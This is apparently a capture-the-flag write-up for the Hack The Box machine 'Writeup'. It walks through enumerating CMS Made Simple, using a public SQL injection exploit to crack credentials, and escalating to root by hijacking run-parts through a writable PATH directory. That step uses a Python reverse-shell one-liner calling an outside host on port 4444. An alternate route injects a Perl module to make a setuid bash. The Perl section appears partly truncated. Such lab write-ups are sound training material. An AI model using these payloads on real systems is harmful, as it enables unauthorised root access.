## **Web Enumeration**
Navigating to the IP address leads to the below webpage.
### http://10.10.10.138/
![home](./home.png "Welcome page")

And the other URL identified by the advanced nmap scan leads us to a writeup repo created by the author.

### http://10.10.10.138/writeup/
![Writeup Home](./writeup.png "Writeup Home")

The two webpages itself do not contain any information and are static in nature. However, a slight difference between the footers on the two pages stands out. The latter says that the website was not created using vim, so we take a look at the tech stack using wappalyzer and whatweb.

### **Wappalyzer and Whatweb**
Wappalyzer tells us that the webpage was built using CMS Made Simple.
![wappalyzer](./wappalyzer.png "Wappalyzer")
The same is confirmed with whatweb as well.
```
$ whatweb http://10.10.10.138/writeup/
http://10.10.10.138/writeup/ [200 OK] Apache[2.4.25], CMS-Made-Simple, Cookies[CMSSESSID9d372ef93962], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.138], MetaGenerator[CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.], Title[Home - writeup]
```

If we check the results for the welcome page hosted on the IP, we only find Apache.
```
$ whatweb http://10.10.10.138/
http://10.10.10.138/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], Email[jkr@writeup.htb], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.138], Title[Nothing here yet.]
```

# Vulnerabilities
Searching for Apache 2.4.25 exploits does not throw up anything. However, CMS Made Simple has a SQL injection vulnerability that could be exploitable (https://www.exploit-db.com/exploits/46635). Since we don't know the version of the software in use, we can run the exploit and see if it works.

# Exploitation
Downloading the code to our working directory, we run it with the required parameters.

```
$ python 46635.py -u http://10.10.10.138/writeup --crack -w /usr/share/wordlists/rockyou.txt 
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62****************************f7
[+] Password cracked: ra******y9
```
And *voilÃ *, we get a set of credentials.
### ***Note: Always verify the commands you are running!!***
```
While running the exploit for the first time, I left out the /writeup part of the URL and did not get any result. Consequently, I wasted a lot of time in searching for other ways to gain access. I was not able to find anything and stepped away from it. The next day, when I was looking over my steps, I found the error and got the exploit to work.
```
## **Gaining a foothold**
We can now connect to the machine via SSH and capture the user flag.

```
$ ssh jkr@10.10.10.138

```

## **Enumeration II**
I found this step to be really hard. I went through my privilege escalation list, one by one, but found nothing that stood out. Finally, I went to 0xdf's writeup for "writeup"(you can find it [here](https://0xdf.gitlab.io/2019/10/12/htb-writeup.html#)) and found that I was on the right track. 

### **Using pspy**
Pspy lists the process running on the system at real time and helps find processes that would have been missed otherwise. The first time that I ran the tool, the only highlight was a cleanup script that ran every minute.

```
2021/07/27 22:42:01 CMD: UID=0    PID=14214  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2021/07/27 22:43:01 CMD: UID=0    PID=14215  | /usr/sbin/CRON 
2021/07/27 22:43:01 CMD: UID=0    PID=14216  | /usr/sbin/CRON 
2021/07/27 22:43:01 CMD: UID=0    PID=14217  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2021/07/27 22:44:01 CMD: UID=0    PID=14218  | /usr/sbin/CRON 
2021/07/27 22:44:01 CMD: UID=0    PID=14219  | /usr/sbin/CRON 
2021/07/27 22:44:01 CMD: UID=0    PID=14220  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
```
But the script was unaccessible and I could not find anything else.

At this point, having literally tried everything I could, I read through 0xdf's writeup to see if I had missed anything till this point. Turns out, I did not check what happens when a new user logs in. Keeping the pspy process running, I fired up a new tab and connected to the machine again. Lo and behold, we find a bash command being executed immediately after the log in.

```
2021/07/27 22:44:04 CMD: UID=0    PID=14221  | sshd: [accepted]
2021/07/27 22:44:04 CMD: UID=102  PID=14222  | sshd: [net]       
2021/07/27 22:44:05 CMD: UID=0    PID=14223  | sshd: jkr [priv]  
2021/07/27 22:44:05 CMD: UID=0    PID=14224  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/27 22:44:05 CMD: UID=0    PID=14225  | run-parts --lsbsysinit /etc/update-motd.d 
2021/07/27 22:44:05 CMD: UID=0    PID=14226  | /bin/sh /etc/update-motd.d/10-uname 
```

## **Privilege Escalation**
The run-parts script is run every time a new user logs in. So, if we can modify it to our advantage, we could possible elevate our privilege.

Looking at the command being run, we can see the PATH value where it will search for the run-parts script. Checking the /usr/local/sbin path, we find that we have write-access to it as a member of the "staff" group and place the modified script there.

```
jkr@writeup:~$ ls -ld /usr/local/sbin/
drwx-wsr-x 2 root staff 12288 Apr 19 04:11 /usr/local/sbin/
jkr@writeup:~$ touch /usr/local/sbin/run-parts
jkr@writeup:~$ cat /usr/local/sbin/run-parts
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.173",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

jkr@writeup:~$ ls -l /usr/local/sbin/run-parts
-rw-r--r-- 1 jkr staff 230 Jul 27 22:53 /usr/local/sbin/run-parts
jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
```
With our script in place and netcat listener running, connecting to the machine again gives us a shell with root privilege.

```
$ nc -nvlp 4444                
listening on [any] 4444 ...
connect to [10.10.16.173] from (UNKNOWN) [10.10.10.138] 54296
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

## **Alternate Escalation Path**
Although I did not think of this, 0xdf's walkthrough tells us how we could have exploited the cleanup script that was being run every minute. 

When a Perl script is run, Perl attempts to load modules required for successful execution. If we can modify any of the modules and add our code, we can possibly elevate our privilege. 

Following the steps, we find that the configured "path" value for Perl contains two directories that do not exist which we can use to our advantage.

```
jkr@writeup:~$ perl -MData::Dumper -e 'print Dumper \%INC'
$VAR1 = {
          'constant.pm' => '/usr/share/perl/5.24/constant.pm',

        };

11d10
<     system "cp /bin/bash /tmp/bash; chmod u+s /tmp/bash";
```

With our malicious module in place, we just need to wait for a minute. The next time the cleanup script runs, the copy of /bin/bash is created in the /tmp folder and can be run to gain root privilege.

```
jkr@writeup:~$ ls -l /tmp/bash 
-rwsr-xr-x 1 root root 1099016 Jul 28 09:44 /tmp/bash
